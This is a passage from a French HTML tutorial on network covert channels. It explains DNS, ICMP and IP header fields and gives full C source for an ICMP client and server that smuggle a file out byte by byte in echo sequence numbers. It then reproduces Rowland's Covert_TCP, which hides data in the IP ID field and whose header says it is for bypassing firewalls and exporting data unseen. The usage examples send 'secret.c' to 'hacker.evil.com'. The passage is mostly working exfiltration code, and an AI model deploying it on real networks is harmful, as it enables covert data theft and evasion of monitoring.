      de .in-addr.arpa. L&agrave; ou l'on peut cacher des donn&eacute;es c'est 
      dans les 4 premiers nombres mais il ne faut pas que ceux-ci d&eacute;passe 
      255 ou soient n&eacute;gatif. Il faut donc formatter les donn&eacute;es 
      mais dans le cas o&ugrave; l'on envoie une commande &agrave; une backdoor, 
      c'est largement suffisant.<br> <br>
      Pour le covert channel DNS je vous laisse trouver des utilitaires qui le 
      font (allez voir &agrave; la fin de l'article).<br>
      De plus au niveau de la programmation de DNS on utilise les sock_dgram qui 
      ne n&eacute;cessite pas les droits root.<br> <br>
      [<a name="RFCUDP"></a>RFC]<br> <a href="http://abcdrfc.free.fr/rfc-vf/rfc768.html">http://abcdrfc.free.fr/rfc-vf/rfc768.html</a><br> 
      <br>
      [<a name="RFCDNS"></a>RFC]<br> <a href="http://abcdrfc.free.fr/rfc-vf/rfc1034.html">http://abcdrfc.free.fr/rfc-vf/rfc1034.html</a><br> 
      <br>
      [<a name="FrameIpUDP"></a>FrameIp]<br> <a href="http://www.frameip.com/enteteudp/">http://www.frameip.com/enteteudp/</a><br> 
      <p class="texttitre">Exemple: Protocole ICMP</p>
      Le protocole ICMP est un protocole de choix en mati&egrave;re de covert 
      channel ou m&ecirc;me de tunneling.<br>
      Pour utiliser le protocole ICMP on utilise les sock_raw et donc le programme 
      n&eacute;cessite les droits root.<br>
      Vous avez l'habitude maintenant, pour plus d'informations sur le protocole 
      ICMP allez voir la [<a href="#RFCICMP">RFC</a>].<br>
      Le header ICMP est bien plus simple que les autres, m&ecirc;me comparer 
      aux deux header UDP.<br> <br>
      Le header ICMP ressemble &agrave;:<br> <img style="width: 611px; height: 284px;"
 alt="http://www.frameip.com/enteteicmp/" src="covert_channel/img/icmp.gif"><br>
      Il n'y a que deux champs qui peuvent nous int&eacute;resser :<br>
      - Identifiant: il peut &ecirc;tre utilis&eacute; par l'&eacute;metteur du 
      message d'&eacute;cho afin d'associer facilement l'&eacute;cho et sa r&eacute;ponse 
      (tout comme le num&eacute;ro de port destination pour TCP ou UDP). On lui 
      attribue g&eacute;n&eacute;ralement le num&eacute;ro de PID du processus.<br>
      - Num&eacute;ro de S&eacute;quence: Son utilit&eacute; est la m&ecirc;me 
      que l'identifiant en compl&eacute;ment de celui-ci. Il est g&eacute;n&eacute;ralement 
      incr&eacute;menter de 1 &agrave; chaque message d'&eacute;cho envoyer.<br> 
      <br>
      Ces deux champs repr&eacute;sentent 32 bits ce qui est pas mal dans un header.<br>
      Si vous ne voulez pas vous tapez toute la RFC, allez donc sur [<a
 href="#FrameIpICMP">FrameIp</a>].<br>
      Le code source utilise le champ N&deg; de S&eacute;quence pour cach&eacute; 
      les donn&eacute;es.<br> <br>
      En pratique cela donne :<br>
      Ce code viens de moi mais est fortement inspir&eacute; du code pr&eacute;c&eacute;dent 
      de Rowland.<br> <pre><code>client.h:<br>     1	#include &lt;stdio.h&gt;<br>     2	#include &lt;stdlib.h&gt;<br>     3	#include &lt;signal.h&gt;<br>     4	#include &lt;string.h&gt;<br>     5	#include &lt;unistd.h&gt;<br>     6	#include &lt;netdb.h&gt;<br>     7	#include &lt;netinet/in.h&gt;<br>     8	#include &lt;sys/socket.h&gt;<br>     9	#include &lt;arpa/inet.h&gt;<br>    10	#include &lt;linux/ip.h&gt;<br>    11	#include &lt;linux/icmp.h&gt;<br>       <br>    12	void forgepacket(unsigned int, unsigned int, char *);<br>    13	unsigned int host_convert(char *);<br>    14	unsigned short in_cksum(unsigned short *, int);<br>    15	void usage(char *);<br><br>client.c:<br>     1	#include "client.h"<br>   <br>     2	int main(int argc, char *argv[]) {    <br>     3	   unsigned int source_host=0,dest_host=0;<br>     4	   int file=0;<br>     5	   int count;<br>     6	   char desthost[80],srchost[80],filename[80];<br>     7	   if(geteuid() !=0)<br>     8	    {<br>     9	    printf("\nYou need to be root to run this.\n\n");<br>    10	    exit(0);<br>    11	    }<br>    12	    <br>    13	   if((argc &lt; 5) || (argc &gt; 13))<br>    14	   {<br>    15	   usage(argv[0]);<br>    16	   exit(0);<br>    17	   }    <br>    18	   for(count=0; count &lt; argc; ++count)<br>    19	    {<br>    20	    if (strcmp(argv[count],"-dest") == 0)<br>    21	     {<br>    22	     dest_host=host_convert(argv[count+1]); <br>    23	     strncpy(desthost,argv[count+1],79);<br>    24	     }<br>    25	     <br>    26	    else if (strcmp(argv[count],"-source") == 0)<br>    27	     {<br>    28	     source_host=host_convert(argv[count+1]); <br>    29	     strncpy(srchost,argv[count+1],79);<br>    30	     }  <br>    31	    else if (strcmp(argv[count],"-file") == 0)<br>    32	     {<br>    33	     strncpy(filename,argv[count+1],79);<br>    34	     file=1;<br>    35	     }<br>    36	    }<br>    37	   if(file != 1)<br>    38	    {<br>    39	    printf("\n\nYou need to supply a filename (-file &lt;filename&gt;)\n\n");<br>    40	    exit(1);<br>    41	    }<br>    42	     if (source_host == 0 &amp;&amp; dest_host == 0)<br>    43	      {<br>    44	      printf("\n\nYou need to supply a source and destination address for client mode.\n\n");<br>    45	      exit(1);<br>    46	      }<br>    47	     else<br>    48	      {<br>    49	      printf("Destination Host: %s\n",desthost);<br>    50	      printf("Source Host     : %s\n",srchost);<br>    51	      printf("Encoded Filename: %s\n",filename);<br>    52	       printf("Encoding Type   : ICMP Seq\n");<br>    53	       printf("\nClient Mode: Sending data.\n\n");<br>    54	      <br>    55	     }<br>    56	     <br>    57	     forgepacket(source_host, dest_host, filename);<br>    58	     exit(0);<br>    59	}<br>       <br>    60	void forgepacket(unsigned int source_addr, unsigned int dest_addr,  char *filename) {<br>    61	   struct send_icmp<br>    62	   {<br>    63	      struct iphdr ip;<br>    64	      struct icmphdr icmp;<br>    65	   } send_icmp;<br>    66	   int ch, szpkt;<br>    67	   int send_socket;<br>    68	   struct sockaddr_in sin;<br>    69	   FILE *input;<br>    70	   <br>    71		srand((getpid())*(sizeof(int))); <br>    72	   szpkt=sizeof(struct iphdr) + sizeof(struct icmphdr);<br>    73	   <br>    74		if((input=fopen(filename,"rb"))== NULL) {<br>    75		  printf("I cannot open the file %s for reading\n",filename);<br>    76		  exit(1);<br>    77		}<br>    78	 <br>    79		else while((ch=fgetc(input)) !=EOF)<br>    80		 {<br>       <br>    81		sleep(1);<br>       <br>    82	   send_icmp.ip.ihl = 5;<br>    83	   send_icmp.ip.version = 4;<br>    84	   send_icmp.ip.tos = 0;<br>    85	   send_icmp.ip.tot_len = htons(40);<br>    86	   send_icmp.ip.id = (int)(255.0*rand()/(RAND_MAX+1.0));<br>    87	   send_icmp.ip.frag_off = 0;<br>    88	   send_icmp.ip.ttl = 64; <br>    89	   send_icmp.ip.protocol = IPPROTO_ICMP;<br>    90	   send_icmp.ip.check = 0;<br>    91	   send_icmp.ip.saddr = source_addr;<br>    92	   send_icmp.ip.daddr = dest_addr;<br>       <br>    93	   send_icmp.icmp.type = 8;<br>    94	   send_icmp.icmp.code = 0;<br>    95	   send_icmp.icmp.un.echo.id = 1000;<br>    96	   <br>    97	   send_icmp.icmp.un.echo.sequence = ch;<br>    98		<br>    99	   sin.sin_family = AF_INET;<br>   100	   sin.sin_addr.s_addr = send_icmp.ip.daddr;   <br>   101	   send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);<br>   102	   if(send_socket &lt; 0)<br>   103	   {<br>   104	      perror("send socket cannot be open. Are you root?");<br>   105	      exit(1);<br>   106	   }<br>   107			<br>   108	      send_icmp.ip.check = in_cksum((unsigned short *)&amp;send_icmp.ip, 20);<br>   109	      <br>   110	      send_icmp.icmp.checksum = 0;<br>   111	      send_icmp.icmp.checksum = in_cksum((unsigned short *)&amp;send_icmp.icmp, sizeof(struct icmphdr));<br>   112	      <br>   113	      sendto(send_socket, &amp;send_icmp, szpkt, 0, (struct sockaddr *)&amp;sin, sizeof(sin));<br>   114	      printf("Sending Data: %c\n",ch);<br>   115	  close(send_socket);<br>   116	 } <br>   117	fclose(input);<br>   118	} <br>       <br>   119	unsigned int host_convert(char *hostname){<br>   120	   static struct in_addr i;<br>   121	   struct hostent *h;<br>   122	   i.s_addr = inet_addr(hostname);<br>   123	   if(i.s_addr == -1)<br>   124	   {<br>   125	      h = gethostbyname(hostname);<br>   126	      if(h == NULL)<br>   127	      {<br>   128	         fprintf(stderr, "cannot resolve %s\n", hostname);<br>   129	         exit(0);<br>   130	      }<br>   131	      bcopy(h-&gt;h_addr, (char *)&amp;i.s_addr, h-&gt;h_length);<br>   132	   }<br>   133	   return i.s_addr;<br>   134	}<br>       <br>   135	unsigned short in_cksum(unsigned short *data, int taille)<br>   136	    {<br>   137	    unsigned long checksum=0;<br>   138	    // ********************************************************<br>   139	    // Complement a 1 de la somme des compl&eacute;ment a 1 sur 16 bits<br>   140	    // ********************************************************<br>   141	    while(taille&gt;1)<br>   142	        {<br>   143	        checksum=checksum+*data++;<br>   144	        taille=taille-sizeof(unsigned short);<br>   145	        }<br>   146	    if(taille)<br>   147	        checksum=checksum+*(unsigned char*)data;<br>   148	    checksum=(checksum&gt;&gt;16)+(checksum&amp;0xffff);<br>   149	    checksum=checksum+(checksum&gt;&gt;16);<br>   150	    return (unsigned short)(~checksum);<br>   151	    }<br>       <br>   152	void usage(char *progname){<br>   153	      printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file \<br>   154	filename\n\n", <br>   155	progname);<br>   156	      printf("-dest dest_ip      - Host to send data to.\n");<br>   157	      printf("-source source_ip  - Host where you want the data to originate \<br>   158	from.\n");<br>   159	      printf("-file filename     - Name of the file to encode and transfer.\n");<br>   160	      printf("\nPress ENTER for examples.");<br>   161	      getchar();<br>   162	      printf("\nExample: \nclient -dest foo.bar.com -source hacker.evil.com -file secret.c\n\n");<br>   163	      printf("Above sends the file secret.c to the host hacker.evil.com a byte \n");<br>   164	      printf("at a time using the default ICMP packet Seq encoding.\n");<br>   165	      exit(0);<br>   166	}<br></code></pre>
      Bon on va passer directement au contenu de client.c vous savez maintenant 
      &agrave; quoi sert client.h<br>
      lignes 2 &agrave; 56: on filtre les arguments pass&eacute;s au programme.<br>
      ligne 57: on appel forgepacket() qui s'occupe du plus important.<br>
      ligne 71: on initialise le g&eacute;n&eacute;rateur de nombre pseudo-al&eacute;atoire 
      &agrave; l'aide d'une graine pas assez variable (&agrave; am&eacute;liorer).<br>
      ligne 72: pour am&eacute;liorer le code je calcul la taille r&eacute;elle 
      des header IP+ICMP pour la passer &agrave; sendto() ligne 113.<br>
      La suite est quasiement pareil que pour TCP sauf:<br>
      ligne 97: on mets le caract&egrave;re dans le champ N&deg; de S&eacute;quence.<br>
      ligne 110: pour calculer le checksum d'un paquet ICMP il <span
 style="text-decoration: underline;">faut</span> initialiser le champ &agrave; 
      0 (ce qui n'est pas obligatoire pour TCP).<br>
      lignes 135 &agrave; 151: on utilise une autre fonction pour calculer le 
      checksum. La fa&ccedil;on de le calculer varie en fonction du protocole 
      : UDP et TCP ont besoin de la fonction du code pr&eacute;c&eacute;dent, 
      IGMP et ICMP ont besoin de cette routine.<br> <br>
      Du c&ocirc;ter du serveur:<br> <pre><code>server.h:<br>     1	#include &lt;stdio.h&gt;<br>     2	#include &lt;stdlib.h&gt;<br>     3	#include &lt;signal.h&gt;<br>     4	#include &lt;string.h&gt;<br>     5	#include &lt;unistd.h&gt;<br>     6	#include &lt;netdb.h&gt;<br>     7	#include &lt;netinet/in.h&gt;<br>     8	#include &lt;sys/socket.h&gt;<br>     9	#include &lt;arpa/inet.h&gt;<br>    10	#include &lt;linux/ip.h&gt;<br>    11	#include &lt;linux/icmp.h&gt;<br>       <br>    12	void forgepacket(unsigned int, unsigned int, char *);<br>    13						  <br>    14	unsigned int host_convert(char *);<br>    15	void usage(char *);<br><br>server.c:<br>     1	#include "server.h"<br>       <br>     2	int main(int argc, char *argv[]){<br>       <br>     3	   unsigned int source_host=0,dest_host=0;<br>     4	   int ipid=0,file=0;<br>     5	   int count;<br>     6	   char desthost[80],srchost[80],filename[80];<br>       <br>     7	   if(geteuid() !=0)<br>     8	    {<br>     9	    printf("\nYou need to be root to run this.\n\n");<br>    10	    exit(0);<br>    11	    }<br>       <br>    12	   if((argc &lt; 5) || (argc &gt; 13))<br>    13	   {<br>    14	   usage(argv[0]);<br>    15	   exit(0);<br>    16	   }<br><br>    17	   for(count=0; count &lt; argc; ++count)<br>    18	    {<br>    19	    if (strcmp(argv[count],"-dest") == 0)<br>    20	     {<br>    21	     dest_host=host_convert(argv[count+1]); <br>    22	     strncpy(desthost,argv[count+1],79);<br>    23	     }<br>    24	     <br>    25	    else if (strcmp(argv[count],"-source") == 0)<br>    26	     {<br>    27	     source_host=host_convert(argv[count+1]); <br>    28	     strncpy(srchost,argv[count+1],79);<br>    29	     }<br>    30	    else if (strcmp(argv[count],"-file") == 0)<br>    31	     {<br>    32	     strncpy(filename,argv[count+1],79);<br>    33	     file=1;<br>    34	     }<br>    35	    }<br><br>    38	  <br>    39	   if(file != 1)<br>    40	    {<br>    41	    printf("\n\nYou need to supply a filename (-file &lt;filename&gt;)\n\n");<br>    42	    exit(1);<br>    43	    }<br>    44	    <br>    45	     if(dest_host == 0) <br>    46	      strcpy(desthost,"Any Host");<br>    47	     if(source_host == 0)<br>    48	      strcpy(srchost,"Any Host");<br>    49	     printf("Listening for data from IP: %s\n",srchost);<br>    50	     <br>    51	     printf("Decoded Filename: %s\n",filename);<br>    52	      printf("Decoding Type Is: ICMP Seq\n"); <br>    53	     printf("\nServer Mode: Listening for data.\n\n");<br>    54	     forgepacket(source_host, dest_host, filename);<br>    55		  exit(0);<br>    56	}<br>       <br>    57	void forgepacket(unsigned int source_addr, unsigned int dest_addr, char *filename) {<br>    58	   struct recv_icmp<br>    59	   {<br>    60	      struct iphdr ip;<br>    61	      struct icmphdr icmp;<br>    62	   } recv_pkt;<br>    63	   <br>    64	   struct sockaddr_in sin;<br>    65	   <br>    66	   int recv_socket;<br>    67	   char *buf = (char *)malloc(2048*sizeof(char));<br>    68	   FILE *output;<br>    69	   <br>    70	   srand((getpid())*(sizeof(int))); <br>    71	    if((output=fopen(filename,"wb"))== NULL) {<br>    72	  			printf("I cannot open the file %s for writing\n",filename);<br>    73	  			exit(1);<br>    74	  		}<br>    75	 while(1) <br>    76	 {<br>    77	   recv_socket = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);<br>    78	   <br>    79	   if(recv_socket &lt; 0)<br>    80	   {<br>    81	      perror("receive socket cannot be open. Are you root?");<br>    82	      exit(1);<br>    83	   }<br>    84	   <br>    85	 read(recv_socket, (struct recv_tcp *)&amp;recv_pkt, 9999);<br>    86	 <br>    87	   if((recv_pkt.icmp.type == 8) &amp;&amp; (recv_pkt.icmp.code == 0)) {	   <br>    88	      printf("Receiving Data: %c\n",recv_pkt.icmp.un.echo.sequence);<br>    89	      fprintf(output,"%c",recv_pkt.icmp.un.echo.sequence);<br>    90	      fflush(output);<br>    91	   } <br>    92	   close(recv_socket); <br>    93	  }<br>    94	  fclose(output);<br>    95	}<br>       <br>    96	unsigned int host_convert(char *hostname)<br>    97	{<br>    98	   static struct in_addr i;<br>    99	   struct hostent *h;<br>   100	   i.s_addr = inet_addr(hostname);<br>   101	   if(i.s_addr == -1)<br>   102	   {<br>   103	      h = gethostbyname(hostname);<br>   104	      if(h == NULL)<br>   105	      {<br>   106	         fprintf(stderr, "cannot resolve %s\n", hostname);<br>   107	         exit(0);<br>   108	      }<br>   109	      bcopy(h-&gt;h_addr, (char *)&amp;i.s_addr, h-&gt;h_length);<br>   110	   }<br>   111	   return i.s_addr;<br>   112	} <br>       <br>   113	void usage(char *progname)<br>   114	{<br>   115	      printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file filename\n\n", <br>   116	progname);<br>   117	      printf("-dest dest_ip      - Host to send data to.\n");<br>   118	      printf("-source source_ip  - Host data will be coming FROM.\n");<br>   119	      printf("-file filename     - Name of the file to encode and transfer.\n");<br>   120	      printf("\nPress ENTER for examples.");<br>   121	      getchar();<br>   122	      printf("\nExample: \nclient -dest foo.bar.com -source hacker.evil.com -file secret.c\n\n");<br>   123	      printf("Above sends the file secret.c to the host hacker.evil.com a byte \n");<br>   124	      printf("at a time using the default IP packet ID encoding.\n");<br>   125	      exit(0);<br>   126	} <br></code></pre>
      Bon on va passer directement au code qui nous int&eacute;resse, le reste 
      est trivial et d&eacute;j&agrave; expliquer plus haut.<br>
      Dans server.c:<br>
      ligne 87 &agrave; 90: si on re&ccedil;oit bien un echo request on r&eacute;cup&egrave;re 
      le contenu du champ N&deg; de S&eacute;quence du paquet re&ccedil;u et on 
      le balance dans un fichier.<br>
      Il y a peut-&ecirc;tre moyen d'utiliser une m&eacute;thode avec rebond, 
      sachant que le N&deg; de S&eacute;quence est incr&eacute;ment&eacute; de 
      1 mais malheureusement cette sp&eacute;cificit&eacute; n'est pas toujours 
      respecter dans la pratique.<br>
      Comme pour les autres codes il y a surement beaucoup d'am&eacute;liorations 
      possibles.<br> <br>
      [<a name="RFCICMP"></a>RFC]<br> <a href="http://abcdrfc.free.fr/rfc-vf/rfc792.html">http://abcdrfc.free.fr/rfc-vf/rfc792.html</a><br> 
      <br>
      [<a name="FrameIpICMP"></a>FrameIp]<br> <a href="http://www.frameip.com/enteteicmp/">http://www.frameip.com/enteteicmp/</a><br> 
      <p class="texttitre">Exemple: Protocole IP</p>
      Le protocole IP est une couche en-dessous de ICMP, UDP ou TCP dans le mod&egrave;le 
      OSI. Il s'agit d'un protocole principalement utiliser pour le routage des 
      donn&eacute;es. Ce protocole poss&egrave;de un header assez simple bien 
      que contenant plus d'informations qu'ICMP. Pour plus d'informations sur 
      IP allez lire la [<a href="#RFCIP">RFC</a>].<br>
      Pour manipuler des paquets IP il faut utiliser les SOCK_RAW et donc il faut 
      les droits root.<br>
      Le header IP ressemble &agrave; &ccedil;a:<br> <img style="width: 611px; height: 284px;"
 alt="http://www.frameip.com/enteteip/" src="covert_channel/img/ip.gif"><br>
      Le champs qui peuvent nous int&eacute;resser sont:<br>
      - Le champ Identification: il est utiliser lorsque l'on fait de la fragmentation, 
      tous les fragments d'un paquet ont le m&ecirc;me identifiant.<br>
      - Le champ TTL: acronyme de Time To Live ce champ permet de sp&eacute;cifier 
      le nombre de routeur que le paquet peut passer avant d'&ecirc;tre d&eacute;truit 
      (pour &eacute;viter les paquets "zombie").<br>
      Tout comme TCP, l'header IP poss&egrave;de un compl&eacute;ment:<br> <img style="width: 611px; height: 285px;"
 alt="http://www.frameip.com/enteteip/" src="covert_channel/img/ipopt.gif"><br>
      - Les options: Ce champ doit, &agrave; l'aide du bourrage, occuper une taille 
      de 4 octets.<br> <br>
      Si vous n'avez pas le courage de lire la RFC en enti&egrave;re, allez faire 
      un tour sur [<a
 href="#FrameIpIP">FrameIp</a>].<br>
      Le code source que je vais vous pr&eacute;sentez a &eacute;t&eacute; &eacute;crit 
      par Rowland dans [<a href="#ROWLANDCOVER">ROWLANDCOVER</a>]. Les donn&eacute;es 
      sont cach&eacute;es dans le champ Identifiant.<br>
      Passons &agrave; la pratique.<br> <pre><code>client.h:<br>     1	#include &lt;stdio.h&gt;<br>     2	#include &lt;stdlib.h&gt;<br>     3	#include &lt;signal.h&gt;<br>     4	#include &lt;string.h&gt;<br>     5	#include &lt;unistd.h&gt;<br>     6	#include &lt;netdb.h&gt;<br>     7	#include &lt;netinet/in.h&gt;<br>     8	#include &lt;sys/socket.h&gt;<br>     9	#include &lt;arpa/inet.h&gt;<br>    10	#include &lt;linux/ip.h&gt;<br>    11	#include &lt;linux/tcp.h&gt;<br>       <br>    12	void forgepacket(unsigned int, unsigned int, unsigned short, unsigned short, char *,<br>    13						  int);<br>    14						  <br>    15	unsigned int host_convert(char *);<br>    16	unsigned short in_cksum(unsigned short *, int);<br>    17	void usage(char *);<br><br>client.c:<br>     1	/* Covert_TCP 1.0 - Covert channel file transfer for Linux<br>     2	* Written by Craig H. Rowland (crowland@psionic.com)<br>     3	* Copyright 1996 Craig H. Rowland (11-15-96)<br>     4	* NOT FOR COMMERCIAL USE WITHOUT PERMISSION. <br>     5	* <br>     6	*<br>     7	* This program manipulates the TCP/IP header to transfer a file one byte<br>     8	* at a time to a destination host. This progam can act as a server and a client<br>     9	* and can be used to conceal transmission of data inside the IP header. <br>    10	* This is useful for bypassing firewalls from the inside, and for <br>    11	* exporting data with innocuous looking packets that contain no data for <br>    12	* sniffers to analyze. In other words, spy stuff... :)<br>    13	*<br>    14	* PLEASE see the enclosed paper for more information!!<br>    15	*<br>    16	* This software should be used at your own risk. <br>    17	*<br>    18	* compile: cc -o covert_tcp covert_tcp.c<br>    19	*<br>    20	* <br>    21	* Portions of this code based on ping.c (c) 1987 Regents of the <br>    22	* University of California. (See function in_cksm() for details)<br>    23	*<br>    24	* Small portions from various packet utilities by unknown authors<br>    25	*/<br>       <br>    26	#include "client.h"<br>       <br>    27	int main(int argc, char *argv[]) {<br>    28	   unsigned int source_host=0,dest_host=0;<br>    29	   unsigned short source_port=0,dest_port=80;<br>    30	   int ipid=0,file=0;<br>    31	   int count;<br>    32	   char desthost[80],srchost[80],filename[80];<br>    33	   if(geteuid() !=0)<br>    34	    {<br>    35	    printf("\nYou need to be root to run this.\n\n");<br>    36	    exit(0);<br>    37	    }<br>    38	    <br>    39	   if((argc &lt; 5) || (argc &gt; 13))<br>    40	   {<br>    41	   usage(argv[0]);<br>    42	   exit(0);<br>    43	   }    <br>    44	   for(count=0; count &lt; argc; ++count)<br>    45	    {<br>    46	    if (strcmp(argv[count],"-dest") == 0)<br>    47	     {<br>    48	     dest_host=host_convert(argv[count+1]); <br>    49	     strncpy(desthost,argv[count+1],79);<br>    50	     }<br>    51	     <br>    52	    else if (strcmp(argv[count],"-source") == 0)<br>    53	     {<br>    54	     source_host=host_convert(argv[count+1]); <br>    55	     strncpy(srchost,argv[count+1],79);<br>    56	     }<br>    57	    else if (strcmp(argv[count],"-file") == 0)<br>    58	     {<br>    59	     strncpy(filename,argv[count+1],79);<br>    60	     file=1;<br>    61	     }<br>    62	    else if (strcmp(argv[count],"-source_port") == 0)<br>    63	      source_port=atoi(argv[count+1]);<br>    64	    else if (strcmp(argv[count],"-dest_port") == 0)<br>    65	      dest_port=atoi(argv[count+1]);<br>    66	    }<br>    67	    ipid=1; <br>    68	   if(file != 1)<br>    69	    {<br>    70	    printf("\n\nYou need to supply a filename (-file &lt;filename&gt;)\n\n");<br>    71	    exit(1);<br>    72	    }<br>    73	     if (source_host == 0 &amp;&amp; dest_host == 0)<br>    74	      {<br>    75	      printf("\n\nYou need to supply a source and destination address for client mode.\n\n");<br>    76	      exit(1);<br>    77	      }<br>    78	     else<br>    79	      {<br>    80	      printf("Destination Host: %s\n",desthost);<br>    81	      printf("Source Host     : %s\n",srchost);<br>    82	       if(source_port == 0)<br>    83	        printf("Originating Port: random\n");<br>    84	       else<br>    85	        printf("Originating Port: %u\n",source_port);<br>    86	      printf("Destination Port: %u\n",dest_port);<br>    87	      printf("Encoded Filename: %s\n",filename);<br>    88	       printf("Encoding Type   : IP ID\n");<br>    89	       printf("\nClient Mode: Sending data.\n\n");<br>    90	      <br>    91	     }<br>    92	     <br>    93	     forgepacket(source_host, dest_host, source_port, dest_port,filename,ipid);<br>    94	     exit(0);<br>    95	}<br>       <br>    96	void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned \<br>    97	short source_port, unsigned short dest_port, char *filename, int ipid) {<br>    98	   struct send_tcp<br>    99	   {<br>   100	      struct iphdr ip;<br>   101	      struct tcphdr tcp;<br>   102	   } send_tcp;<br>   103	   struct pseudo_header<br>   104	   {<br>   105	      unsigned int source_address;<br>   106	      unsigned int dest_address;<br>   107	      unsigned char placeholder;<br>   108	      unsigned char protocol;<br>   109	      unsigned short tcp_length;<br>   110	      struct tcphdr tcp;<br>   111	   } pseudo_header<br>   112	   int ch;<br>   113	   int send_socket;<br>   114	   struct sockaddr_in sin;<br>   115	   FILE *input;<br>   116	   <br>   117		srand((getpid())*(dest_port)); <br>   118		<br>   119		if((input=fopen(filename,"rb"))== NULL)<br>   120	 {<br>   121	 printf("I cannot open the file %s for reading\n",filename);<br>   122	 exit(1);<br>   123	 }<br>   124	else while((ch=fgetc(input)) !=EOF)<br>   125	 {<br>   126		sleep(1);<br>   127	   send_tcp.ip.ihl = 5;<br>   128	   send_tcp.ip.version = 4;<br>   129	   send_tcp.ip.tos = 0;<br>   130	   send_tcp.ip.tot_len = htons(40);<br>   131	   send_tcp.ip.id =ch;<br>   133	   send_tcp.ip.frag_off = 0;<br>   134	   send_tcp.ip.ttl = 64; <br>   135	   send_tcp.ip.protocol = IPPROTO_TCP;<br>   136	   send_tcp.ip.check = 0;<br>   137	   send_tcp.ip.saddr = source_addr;<br>   138	   send_tcp.ip.daddr = dest_addr;<br>       <br>   139	if(source_port == 0) <br>   140	   send_tcp.tcp.source = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));<br>       <br>   141	else <br>   142	   send_tcp.tcp.source = htons(source_port);<br>   143	   send_tcp.tcp.seq = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));<br>   144	   send_tcp.tcp.dest = htons(dest_port);<br>   145	   send_tcp.tcp.ack_seq = 0;<br>   146	   send_tcp.tcp.res1 = 0;<br>   147	   send_tcp.tcp.doff = 5;<br>   148	   send_tcp.tcp.fin = 0;<br>   149	   send_tcp.tcp.syn = 1;<br>   150	   send_tcp.tcp.rst = 0;<br>   151	   send_tcp.tcp.psh = 0;<br>   152	   send_tcp.tcp.ack = 0;<br>   153	   send_tcp.tcp.urg = 0;<br>   154	   send_tcp.tcp.ece = 0;<br>   155	   send_tcp.tcp.window = htons(512);<br>   156	   send_tcp.tcp.check = 0;<br>   157	   send_tcp.tcp.urg_ptr = 0;<br>       <br>   158	   sin.sin_family = AF_INET;<br>   159	   sin.sin_port = send_tcp.tcp.source;<br>   160	   sin.sin_addr.s_addr = send_tcp.ip.daddr;   <br>       <br>   161	   send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);<br>   162	   if(send_socket &lt; 0)<br>   163	   {<br>   164	      perror("send socket cannot be open. Are you root?");<br>   165	      exit(1);<br>   166	   }<br>       <br>   167	      send_tcp.ip.check = in_cksum((unsigned short *)&amp;send_tcp.ip, 20);<br>   168	      <br>   169	      pseudo_header.source_address = send_tcp.ip.saddr;<br>   170	      pseudo_header.dest_address = send_tcp.ip.daddr;<br>   171	      pseudo_header.placeholder = 0;<br>   172	      pseudo_header.protocol = IPPROTO_TCP;<br>   173	      pseudo_header.tcp_length = htons(20);<br>       <br>   174	      bcopy((char *)&amp;send_tcp.tcp, (char *)&amp;pseudo_header.tcp, 20);<br>       <br>   175	      send_tcp.tcp.check = in_cksum((unsigned short *)&amp;pseudo_header, 32);<br>       <br>   176	      sendto(send_socket, &amp;send_tcp, 40, 0, (struct sockaddr *)&amp;sin, sizeof(sin));<br>   177	      printf("Sending Data: %c\n",ch);<br>       <br>   178	  close(send_socket);<br>   179	 } <br>       <br>   180	fclose(input);<br>   181	} <br>       <br>   182	unsigned int host_convert(char *hostname){<br>   183	   static struct in_addr i;<br>   184	   struct hostent *h;<br>   185	   i.s_addr = inet_addr(hostname);<br>   186	   if(i.s_addr == -1)<br>   187	   {<br>   188	      h = gethostbyname(hostname);<br>   189	      if(h == NULL)<br>   190	      {<br>   191	         fprintf(stderr, "cannot resolve %s\n", hostname);<br>   192	         exit(0);<br>   193	      }<br>   194	      bcopy(h-&gt;h_addr, (char *)&amp;i.s_addr, h-&gt;h_length);<br>   195	   }<br>   196	   return i.s_addr;<br>   197	}<br>       <br>   198	unsigned short in_cksum(unsigned short *ptr, int nbytes){<br>   199	        register long           sum;            /* assumes long == 32 bits <br>   200	*/<br>   201	        u_short                 oddbyte;<br>   202	        register u_short        answer;         /* assumes u_short == 16 bits */<br>       <br>   203	        /*<br>   204	         * Our algorithm is simple, using a 32-bit accumulator (sum),<br>   205	         * we add sequential 16-bit words to it, and at the end, fold back<br>   206	         * all the carry bits from the top 16 bits into the lower 16 bits.<br>   207	         */<br>       <br>   208	        sum = 0;<br>   209	        while (nbytes &gt; 1)  {<br>   210	                sum += *ptr++;<br>   211	                nbytes -= 2;<br>   212	        }<br>       <br>   213	                                /* mop up an odd byte, if necessary */<br>   214	        if (nbytes == 1) {<br>   215	                oddbyte = 0;            /* make sure top half is zero */<br>   216	                *((u_char *) &amp;oddbyte) = *(u_char *)ptr;   /* one byte only */<br>   217	                sum += oddbyte;<br>   218	        }<br>       <br>   219	        /*<br>   220	         * Add back carry outs from top 16 bits to low 16 bits.<br>   221	         */<br>       <br>   222	        sum  = (sum &gt;&gt; 16) + (sum &amp; 0xffff);    /* add high-16 to low-16 */<br>   223	        sum += (sum &gt;&gt; 16);                     /* add carry */<br>   224	        answer = ~sum;          /* ones-complement, then truncate to 16 bits <br>   225	*/<br>   226	        return(answer);<br>   227	}<br>       <br>       <br>   228	void usage(char *progname){<br>   229	      printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file \<br>   230	filename\n\n", <br>   231	progname);<br>   232	      printf("-dest dest_ip      - Host to send data to.\n");<br>   233	      printf("-source source_ip  - Host where you want the data to originate \<br>   234	from.\n");<br>   235	      printf("-source_port port  - IP source port you want data to appear from. \n");<br>   236	      printf("                     (randomly set by default)\n");<br>   237	      printf("-dest_port port    - IP source port you want data to go to. In\n");<br>   238	      printf("                     SERVER mode this is the port data will be coming\n");<br>   239	      printf("                     inbound on. Port 80 by default.\n");<br>   240	      printf("-file filename     - Name of the file to encode and transfer.\n");<br>   241	      printf("\nPress ENTER for examples.");<br>   242	      getchar();<br>   243	      printf("\nExample: \nclient -dest foo.bar.com -source hacker.evil.com \<br>   244	      -file secret.c\n\n");<br>   245	      printf("Above sends the file secret.c to the host hacker.evil.com a byte 